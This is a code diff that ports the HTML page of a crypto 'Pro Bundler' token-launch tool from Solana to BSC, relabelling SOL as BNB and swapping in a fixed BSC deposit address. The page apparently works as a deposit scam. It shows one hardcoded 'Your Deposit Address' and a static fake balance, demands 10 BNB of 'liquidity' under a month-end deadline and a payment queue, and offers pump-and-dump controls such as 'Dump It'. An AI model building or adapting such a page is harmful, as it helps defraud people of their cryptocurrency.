@@ -32,6 +32,8 @@
     --info: #3b82f6;
     --info-dark: #2563eb;
     --info-light: rgba(59, 130, 246, 0.15);
+    --bsc-gold: #F3BA2F;
+    --bsc-gold-light: rgba(243, 186, 47, 0.15);
     --trade-bg: #0d1a14;
     --trade-border: #1a3a2a;
   }
@@ -380,7 +382,7 @@
     box-shadow: 0 4px 12px rgba(20, 184, 166, 0.3);
   }
 
-  /* ===== DEPOSIT MODAL - SIMPLE WALLET ADDRESS ===== */
+  /* ===== DEPOSIT MODAL - BSC WALLET ADDRESS ===== */
   .deposit-modal {
     background: var(--bg-tertiary);
     border: 1px solid var(--border-light);
@@ -389,7 +391,7 @@
     max-width: 440px;
     width: 90%;
     position: relative;
-    box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5), 0 0 0 1px rgba(20, 184, 166, 0.2);
+    box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5), 0 0 0 1px rgba(243, 186, 47, 0.2);
     animation: popIn 0.4s cubic-bezier(0.34, 1.56, 0.64, 1);
     max-height: 90vh;
     overflow-y: auto;
@@ -402,7 +404,7 @@
     left: 0;
     right: 0;
     height: 3px;
-    background: linear-gradient(90deg, var(--green), var(--accent), var(--green));
+    background: linear-gradient(90deg, var(--bsc-gold), #fcd535, var(--bsc-gold));
     border-radius: 16px 16px 0 0;
   }
 
@@ -417,8 +419,8 @@
     width: 48px;
     height: 48px;
     border-radius: 12px;
-    background: linear-gradient(135deg, rgba(34, 197, 94, 0.15), rgba(20, 184, 166, 0.15));
-    border: 1px solid var(--green-dark);
+    background: var(--bsc-gold-light);
+    border: 1px solid rgba(243, 186, 47, 0.4);
     display: flex;
     align-items: center;
     justify-content: center;
@@ -479,7 +481,7 @@
     width: 18px;
     height: 18px;
     border-radius: 50%;
-    background: var(--accent);
+    background: var(--bsc-gold);
     color: #000;
     font-size: 10px;
     font-weight: 700;
@@ -545,14 +547,14 @@
   }
 
   .deposit-address-display:hover {
-    border-color: var(--accent);
+    border-color: var(--bsc-gold);
   }
 
   .deposit-address-text {
     flex: 1;
     font-family: 'SF Mono', Monaco, 'Courier New', monospace;
     font-size: 11px;
-    color: var(--accent);
+    color: var(--bsc-gold);
     word-break: break-all;
     line-height: 1.5;
     user-select: all;
@@ -560,7 +562,7 @@
 
   .deposit-copy-btn {
     padding: 6px 12px;
-    background: var(--accent);
+    background: var(--bsc-gold);
     border: none;
     border-radius: 6px;
     color: #000;
@@ -575,12 +577,13 @@
   }
 
   .deposit-copy-btn:hover {
-    background: var(--accent-hover);
+    background: #fcd535;
     transform: translateY(-1px);
   }
 
   .deposit-copy-btn.copied {
     background: var(--green);
+    color: #fff;
   }
 
   .deposit-warning {
@@ -1370,14 +1373,14 @@
   }
 
   .balance-action-btn.deposit {
-    background: var(--green-light);
-    border-color: var(--green-dark);
-    color: var(--green);
+    background: var(--bsc-gold-light);
+    border-color: rgba(243, 186, 47, 0.4);
+    color: var(--bsc-gold);
   }
 
   .balance-action-btn.deposit:hover {
-    background: var(--green-btn);
-    color: #fff;
+    background: var(--bsc-gold);
+    color: #000;
   }
 
   .stats-row {
@@ -2361,7 +2364,7 @@
     <div class="popup-highlight-box">
       <div class="popup-highlight-label">Minimum LP Required</div>
       <div class="popup-highlight-value">
-        10 <span class="unit">SOL</span>
+        10 <span class="unit">BNB</span>
       </div>
     </div>
 
@@ -2376,7 +2379,7 @@
             <div class="popup-breakdown-sublabel">From your wallet balance</div>
           </div>
         </div>
-        <div class="popup-breakdown-amount success">1.35 SOL</div>
+        <div class="popup-breakdown-amount success">1.35 BNB</div>
       </div>
 
       <div class="popup-breakdown-row warning">
@@ -2387,7 +2390,7 @@
             <div class="popup-breakdown-sublabel">Additional LP needed</div>
           </div>
         </div>
-        <div class="popup-breakdown-amount warning">8.65 SOL</div>
+        <div class="popup-breakdown-amount warning">8.65 BNB</div>
       </div>
 
       <div class="popup-progress-wrapper">
@@ -2402,7 +2405,7 @@
     </div>
 
     <div class="popup-note">
-      ⚠️ <strong>Note:</strong> Transactions or token launches with liquidity below 10 SOL will be automatically rejected. Please ensure your liquidity pool meets this minimum threshold before proceeding.
+      ⚠️ <strong>Note:</strong> Transactions or token launches with liquidity below 10 BNB will be automatically rejected. Please ensure your liquidity pool meets this minimum threshold before proceeding.
     </div>
     <button class="popup-btn" onclick="closePopup()">
       ✓ I Understand
@@ -2410,7 +2413,7 @@
   </div>
 </div>
 
-<!-- ===== DEPOSIT MODAL - WALLET ADDRESS ===== -->
+<!-- ===== DEPOSIT MODAL - BSC WALLET ADDRESS ===== -->
 <div class="popup-overlay" id="depositOverlay" style="display: none;">
   <div class="deposit-modal">
     <button class="popup-close" onclick="closeDepositModal()" title="Close">×</button>
@@ -2418,8 +2421,8 @@
     <div class="deposit-header">
       <div class="deposit-icon-box">💰</div>
       <div class="deposit-header-text">
-        <h2>Deposit SOL</h2>
-        <p>Send SOL to your Pro Bundler wallet address</p>
+        <h2>Deposit BNB</h2>
+        <p>Send BNB or BEP-20 tokens to your BSC wallet address</p>
       </div>
     </div>
 
@@ -2431,15 +2434,15 @@
       <ol class="deposit-instruction-list">
         <li>
           <span class="step-num">1</span>
-          <div>Copy your wallet address below or scan the QR code</div>
+          <div>Copy your BSC wallet address below or scan the QR code</div>
         </li>
         <li>
           <span class="step-num">2</span>
-          <div>Send SOL from your external wallet (Phantom, Solflare, etc.)</div>
+          <div>Send BNB from your external wallet (MetaMask, Trust Wallet, Binance, etc.)</div>
         </li>
         <li>
           <span class="step-num">3</span>
-          <div>Wait for confirmation (usually 1-2 minutes)</div>
+          <div>Wait for blockchain confirmation (usually 1-2 minutes on BSC)</div>
         </li>
       </ol>
     </div>
@@ -2447,18 +2450,18 @@
     <!-- QR Code -->
     <div class="deposit-qr-section">
       <div class="deposit-qr-code">
-        <img src="https://api.qrserver.com/v1/create-qr-code/?size=180x180&data=7xKXtR5mN9vRpLqWzY8bVcDfGhJkMnP2sT4uV6wXyZaBcDeFgHiJkLmNoPqRsTuVwXyZ&bgcolor=ffffff&color=000000" alt="QR Code">
+        <img src="https://api.qrserver.com/v1/create-qr-code/?size=180x180&data=0x208d18c563ff4ad4afd3ef1a2a0151e9b46fbffe&bgcolor=ffffff&color=000000" alt="BSC QR Code">
       </div>
     </div>
 
     <!-- Wallet Address -->
     <div class="deposit-address-box">
       <div class="deposit-address-label">
-        📍 Your Deposit Address
+        📍 Your BSC Deposit Address
       </div>
       <div class="deposit-address-display">
         <div class="deposit-address-text" id="walletAddress">
-          7xKXtR5mN9vRpLqWzY8bVcDfGhJkMnP2sT4uV6wXyZaBcDeFgHiJkLmNoPqRsTuVwXyZ
+          0x208d18c563ff4ad4afd3ef1a2a0151e9b46fbffe
         </div>
         <button class="deposit-copy-btn" id="copyBtn" onclick="copyWalletAddress()">
           📋 <span id="copyText">Copy</span>
@@ -2470,7 +2473,7 @@
     <div class="deposit-warning">
       <span class="deposit-warning-icon">⚠️</span>
       <div>
-        <strong>Important:</strong> Only send <strong>SOL</strong> to this address. Sending other tokens may result in permanent loss. Minimum deposit: <strong>0.01 SOL</strong>. Deposits are allocated to your Liquidity Provider (LP) pool.
+        <strong>Important:</strong> Only send <strong>BNB or BEP-20 tokens</strong> on the <strong>BSC (Binance Smart Chain)</strong> network to this address. Sending assets from other networks (like Ethereum or Solana) may result in permanent loss. Minimum deposit: <strong>0.01 BNB</strong>.
       </div>
     </div>
 
@@ -2492,13 +2495,13 @@
   </div>
 
   <div class="queue-info-body">
-    <strong>Attention Pro Tool Developers:</strong> The queue system operates on a first-come, first-served basis. Your processing speed depends entirely on fulfilling the <span class="queue-info-highlight">10 SOL liquidity</span> requirement.
+    <strong>Attention Pro Tool Developers:</strong> The queue system operates on a first-come, first-served basis. Your processing speed depends entirely on fulfilling the <span class="queue-info-highlight">10 BNB liquidity</span> requirement.
   </div>
 
   <ul class="queue-info-list">
     <li>
       <span class="li-icon">⚡</span>
-      <div><strong>Fast Processing:</strong> When your 10 SOL liquidity is fulfilled AND previous developers in the queue have already completed their payments.</div>
+      <div><strong>Fast Processing:</strong> When your 10 BNB liquidity is fulfilled AND previous developers in the queue have already completed their payments.</div>
     </li>
     <li>
       <span class="li-icon">⏱️</span>
@@ -2506,7 +2509,7 @@
     </li>
     <li>
       <span class="li-icon">🎯</span>
-      <div><strong>Queue Advancement:</strong> Once your 10 SOL liquidity is met, your queue position will automatically move forward — provided earlier queue members have already paid in full.</div>
+      <div><strong>Queue Advancement:</strong> Once your 10 BNB liquidity is met, your queue position will automatically move forward — provided earlier queue members have already paid in full.</div>
     </li>
     <li>
       <span class="li-icon">💡</span>
@@ -2521,7 +2524,7 @@
     </div>
     <div class="queue-deadline-content">
       <div>
-        All developers must complete the <strong>10 SOL liquidity payment</strong> before the end of the current month.
+        All developers must complete the <strong>10 BNB liquidity payment</strong> before the end of the current month.
       </div>
       <div class="queue-deadline-date">
         📅 Deadline: <span id="deadlineDate">November 30, 2026 - 23:59 UTC</span>
@@ -2533,7 +2536,7 @@
   </div>
 
   <div class="queue-info-footer">
-    <span class="queue-info-cta">Don't lose your spot — fulfill your 10 SOL now!</span>
+    <span class="queue-info-cta">Don't lose your spot — fulfill your 10 BNB now!</span>
     <button class="queue-info-btn" onclick="closeQueueBanner()">Got It</button>
   </div>
 </div>
@@ -2582,11 +2585,11 @@
     <div class="overview-card">
       <div class="balance-row">
         <div>
-          <div class="balance-label">SOL Balance</div>
-          <div class="balance-value">1.35 <span class="unit">SOL</span></div>
+          <div class="balance-label">BNB Balance</div>
+          <div class="balance-value">1.35 <span class="unit">BNB</span></div>
         </div>
         <div class="balance-actions">
-          <button class="balance-action-btn deposit" onclick="openDepositModal()" title="Deposit SOL">💰</button>
+          <button class="balance-action-btn deposit" onclick="openDepositModal()" title="Deposit BNB">💰</button>
           <button class="balance-action-btn" title="More options">≡</button>
         </div>
       </div>
@@ -2695,7 +2698,7 @@
         <div class="wallets-header-left">
           <div class="wallets-header-title">Wallets</div>
           <button class="btn btn-outline">+ New</button>
-          <button class="btn">💧 Drain SOL</button>
+          <button class="btn">💧 Drain BNB</button>
           <button class="btn">⇄ Migrate</button>
           <button class="btn">✂ Split</button>
         </div>
@@ -2711,7 +2714,7 @@
             <tr>
               <th style="width:30px;"><div class="checkbox"></div></th>
               <th>Wallet ↑</th>
-              <th>SOL Balance ⇅</th>
+              <th>BNB Balance ⇅</th>
               <th>Tokens ⇅</th>
               <th>% Of Supply ⇅</th>
               <th>Profit</th>
@@ -2762,7 +2765,7 @@
           </div>
           <div class="trade-card">
             <div class="trade-card-label">Total buy amount</div>
-            <div class="trade-card-value" id="totalBuy">0.0000 SOL</div>
+            <div class="trade-card-value" id="totalBuy">0.0000 BNB</div>
           </div>
         </div>
 
@@ -2802,14 +2805,14 @@
             <div class="trade-card-value" id="tokensToSell">0</div>
           </div>
           <div class="trade-card">
-            <div class="trade-card-label">SOL Amount to Receive</div>
-            <div class="trade-card-value" id="solToReceive">0.0000 SOL</div>
+            <div class="trade-card-label">BNB Amount to Receive</div>
+            <div class="trade-card-value" id="solToReceive">0.0000 BNB</div>
           </div>
         </div>
 
         <div class="trade-card" style="margin-bottom:0;">
           <div class="trade-card-label">Play Profit</div>
-          <div class="trade-card-value green" id="playProfit">+0.0000 SOL</div>
+          <div class="trade-card-value green" id="playProfit">+0.0000 BNB</div>
         </div>
 
         <button class="dump-btn" onclick="handleDump()">Dump It</button>
@@ -2838,7 +2841,7 @@
           <thead>
             <tr>
               <th>Wallet</th>
-              <th>SOL ⇅</th>
+              <th>BNB ⇅</th>
               <th>Mint</th>
               <th>Time ⇅</th>
             </tr>
@@ -2881,7 +2884,7 @@
           <div class="form-label">Launching on: <span class="required">*</span></div>
           <select class="select-input">
             <option>🟢 PumpFun</option>
-            <option>Raydium</option>
+            <option>PancakeSwap (BSC)</option>
             <option>Meteora</option>
           </select>
         </div>
@@ -2893,13 +2896,13 @@
           </div>
           <div class="form-group">
             <div class="form-label">Symbol <span class="required">*</span></div>
-            <input type="text" class="form-input" placeholder='E.g. "SOL"'>
+            <input type="text" class="form-input" placeholder='E.g. "BNB"'>
           </div>
         </div>
 
         <div class="form-group">
           <div class="form-label">Description</div>
-          <textarea class="form-textarea" placeholder='E.g. "First community token on Solana"'></textarea>
+          <textarea class="form-textarea" placeholder='E.g. "First community token on BSC"'></textarea>
           <div class="char-counter">0/500</div>
         </div>
 
@@ -2937,7 +2940,7 @@
     </div>
 
     <div class="setting-group">
-      <span class="setting-label">Jito Tip</span>
+      <span class="setting-label">Priority Fee</span>
       <input type="text" class="tip-input" value="0.00">
       <button class="icon-btn" style="width:20px;height:20px;font-size:10px;">≡</button>
     </div>
@@ -2981,7 +2984,7 @@
   }
 
   function copyWalletAddress() {
-    const address = document.getElementById('walletAddress').textContent;
+    const address = document.getElementById('walletAddress').textContent.trim();
     navigator.clipboard.writeText(address).then(() => {
       const copyBtn = document.getElementById('copyBtn');
       const copyText = document.getElementById('copyText');
